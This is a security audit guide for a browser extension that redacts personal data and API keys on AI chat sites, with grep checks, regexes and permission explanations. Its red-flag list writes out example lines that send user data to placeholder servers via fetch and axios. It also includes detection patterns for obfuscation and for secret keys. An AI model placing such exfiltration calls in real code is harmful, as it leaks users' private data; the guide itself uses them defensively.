# Security Audit Guide

## 🔒 How to Verify Axiom Shield is Safe

We built Axiom Shield to be **100% auditable**. This guide shows you how to verify our claims.

---

## 1️⃣ Verify No External Network Calls

**What to check:** Ensure your data never leaves your browser.

**How to verify:**

### Method 1: Code Search
```bash
git clone https://github.com/productdeveloper/Axiom-Shield
cd Axiom-Shield

# Search for network-related APIs
grep -r "fetch\|XMLHttpRequest\|axios\|$.ajax\|$.post\|$.get" src/

# Expected result: ZERO matches in core extension files
```

**What you should see:**
- ✅ No `fetch()` calls
- ✅ No `XMLHttpRequest` usage
- ✅ No third-party HTTP libraries

**What would be a red flag:**
- ❌ `fetch('https://some-server.com', { body: userData })`
- ❌ `axios.post('https://api.example.com', sensitiveData)`

---

### Method 2: Browser DevTools
```bash
1. Load the extension in Chrome
2. Open ChatGPT
3. Press F12 (Developer Tools)
4. Go to "Network" tab
5. Type sensitive data (e.g., test@email.com)
6. Watch Network tab
```

**Expected result:** ZERO network requests from the extension

**If you see network requests:** Report it immediately to contact@aimagine.in

---

## 2️⃣ Audit PII Detection Patterns

**What to check:** Are the regex patterns actually detecting PII correctly?

**File to review:** [`axiom-shield/content.js`](axiom-shield/content.js)

### Email Detection
```javascript
email: /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g
```

**Test it yourself:**
```javascript
const pattern = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g;

console.log('john@example.com'.match(pattern));  // Should match
console.log('not-an-email'.match(pattern));      // Should NOT match
```

### Phone Number Detection
```javascript
phone: /\b(\+\d{1,2}\s?)?(\(?\d{3}\)?[\s.-]?)?\d{3}[\s.-]?\d{4}\b/g
```

**Test it yourself:**
```javascript
const pattern = /\b(\+\d{1,2}\s?)?(\(?\d{3}\)?[\s.-]?)?\d{3}[\s.-]?\d{4}\b/g;

console.log('555-123-4567'.match(pattern));      // Should match
console.log('+1-555-123-4567'.match(pattern));   // Should match
console.log('not a phone'.match(pattern));       // Should NOT match
```

### API Key Detection
```javascript
openai: /sk-(?:proj-)?[a-zA-Z0-9_-]{8,}/g
aws: /AKIA[0-9A-Z]{16,}/g
github: /ghp_[a-zA-Z0-9]{36,}/g
```

---

## 3️⃣ Review Redaction Logic

**What to check:** Does it actually replace sensitive data?

**File to review:** [`axiom-shield/content.js`](axiom-shield/content.js)

**Key logic:**
```javascript
// Example of how we redact in axiom-shield/content.js
text = text.replace(piiPatterns.email, '[EMAIL_REDACTED]');
text = text.replace(piiPatterns.phone, '[PHONE_REDACTED]');
text = text.replace(piiPatterns.secret, '[KEY_REDACTED]');
```

**What to verify:**
- ✅ It's doing simple string replacement (safe)
- ✅ It's NOT sending data anywhere
- ✅ It's NOT storing data

**Red flags would be:**
- ❌ `sendToServer(text)` before redaction
- ❌ `localStorage.setItem('userData', text)`
- ❌ Complex encryption (why would it need that?)

---

## 4️⃣ Check Extension Permissions

**What to check:** Is the extension requesting excessive permissions?

**File to review:** [`axiom-shield/manifest.json`](axiom-shield/manifest.json)

**Our permissions:**
```json
{
  "permissions": [
    "activeTab",
    "scripting"
  ],
  "host_permissions": [
    "https://chatgpt.com/*",
    "https://gemini.google.com/*",
    "https://claude.ai/*",
    "https://*.anthropic.com/*",
    "https://*.openai.com/*",
    "https://*.google.com/*"
  ]
}
```

**Why we need each permission:**

| Permission | Why We Need It | What It Allows |
|------------|---------------|----------------|
| `activeTab` | Monitor text input locally | Read content of current tab only |
| `scripting` | Inject redaction logic | Run our code on the page |
| `host_permissions` | Target AI platforms | Only works on specified AI sites |

**Red flags to watch for:**
- ❌ `<all_urls>` (would work on ALL websites - excessive)
- ❌ `storage` (we don't need to store your data)
- ❌ `cookies` (we don't need your login info)
- ❌ `webRequest` (we don't intercept network traffic)

**We have NONE of these.** ✅

---

## 5️⃣ Verify No Obfuscation

**What to check:** Is the code readable or intentionally hidden?

**How to verify:**
```bash
# Look for signs of obfuscation
grep -r "eval(" axiom-shield/          # Should be ZERO
grep -r "Function(" axiom-shield/      # Should be ZERO
grep -r "atob(" axiom-shield/          # Base64 decode (suspicious if found)

# Check for minified code
cat axiom-shield/content.js | head -20
```

**What you should see:**
- ✅ Readable variable names
- ✅ Comments explaining logic
- ✅ Formatted code (not one long line)

**Red flags:**
- ❌ Variable names like: `_0x4a2b`, `__encode`, `obf_123`
- ❌ Base64-encoded strings containing JavaScript
- ❌ Use of `eval()` or `new Function()`

---

## 6️⃣ Check for Third-Party Scripts

**What to check:** Are we loading any external JavaScript?

**How to verify:**
```bash
# Search for external script loads
grep -r "script src=" axiom-shield/
grep -r "import.*from.*http" axiom-shield/

# Expected: ZERO external scripts
```

**We only use:**
- ✅ Our own code (100% local)
- ✅ No CDN scripts
- ✅ No analytics (not even Google Analytics)

---

## 🚨 Red Flags - When NOT to Use

**DO NOT use this extension if you find:**

### Critical Issues (Report Immediately)
- ❌ Network calls to unknown domains
- ❌ Data being sent to any server
- ❌ Base64-encoded JavaScript that runs via `eval()`
- ❌ Requesting `<all_urls>` permission
- ❌ Storage of unencrypted PII

### Suspicious Patterns
- ⚠️ Obfuscated variable names
- ⚠️ Minified code in source (should be readable)
- ⚠️ Excessive permissions for stated functionality
- ⚠️ Third-party scripts from unknown sources

**If you find ANY of these, email:** contact@aimagine.in

---

## 🛡️ Our Security Commitments

### What We Guarantee:
1. ✅ **No data collection:** We don't collect, store, or transmit your data
2. ✅ **No tracking:** No analytics, no telemetry, no phone-home
3. ✅ **No external servers:** Everything runs in your browser
4. ✅ **Open source:** Every line of code is auditable
5. ✅ **Regular audits:** We encourage security researchers to review our code

### What We Don't Do:
1. ❌ Collect usage statistics
2. ❌ Store your redacted data
3. ❌ Send data to our servers (we don't have servers!)
4. ❌ Use third-party analytics
5. ❌ Sell your data (we don't have your data to sell)

---

## 📞 Report Security Issues

**Found a security vulnerability?**

**Email:** contact@aimagine.in

**Please include:**
- Description of the issue
- Steps to reproduce
- Potential impact
- Suggested fix (if you have one)

**Response time:**
- Critical issues: Within 24 hours
- Non-critical issues: Within 72 hours

**Bounty:** We don't have a formal bug bounty program yet, but we'll send swag/credit to anyone who finds a legitimate security issue.

---

## 🔍 Independent Security Audits

**Status:** Not yet audited by third-party firm

**Roadmap:**
- Month 3: Commission independent security audit
- Month 6: Penetration testing
- Month 12: SOC 2 Type I compliance (if we launch Enterprise tier)

**Want to help?** We welcome security researchers to audit our code and report findings.

---

## 📚 Additional Resources

- **Privacy Policy:** https://shield.aimagine.in/privacy
- **GitHub Repository:** https://github.com/productdeveloper/Axiom-Shield
- **Contact:** contact@aimagine.in
- **Founder:** [Vimal Makhija](https://www.linkedin.com/in/vimalmakhija/)

---

## ✅ Quick Verification Checklist

Before trusting Axiom Shield, verify:

- [ ] No network calls in code (`grep -r "fetch"`)
- [ ] No external scripts loaded
- [ ] Permissions are minimal (only activeTab + scripting)
- [ ] Code is readable (not obfuscated)
- [ ] PII patterns are sensible (not overly broad)
- [ ] Privacy policy exists and is clear

**If all checkboxes pass:** You're good to go! ✅

---

**Last Updated:** February 2, 2026  
**Version:** 1.0.0
